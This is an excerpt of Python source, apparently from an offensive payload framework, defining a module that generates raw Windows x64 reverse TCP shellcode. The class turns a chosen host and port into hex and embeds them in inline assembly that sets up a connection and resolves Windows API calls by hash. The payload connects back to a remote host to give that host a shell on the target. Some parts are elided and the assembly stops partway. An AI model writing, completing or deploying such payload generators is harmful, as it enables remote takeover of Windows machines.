...
class WindowsX64ShellReverseTcp(BaseModule):
    """
    Module to generate a raw reverse TCP shellcode payload targeting Windows x64.

    This payload connects back to a specified IPv4 host and port.
    """

    module_name = "WindowsX64ShellReverseTcp"
    module_description = (
        "Generates reverse TCP payload targeting Windows x64 platforms."
    )
    ...
    def main(args) -> None:
        ...
        try:
            host_hex = WindowsX64ShellReverseTcp.host_to_hex(args.host)
            port_hex = WindowsX64ShellReverseTcp.port_to_hex(args.port)
        except Exception:
        ...
        sub    rsp,0x1a0
        mov    r13,rsp
        movabs r12,0x{host_hex}{port_hex}0002
        push   r12
        mov    r12,rsp
        mov    rcx,r14
        mov    r10d,0x726774c
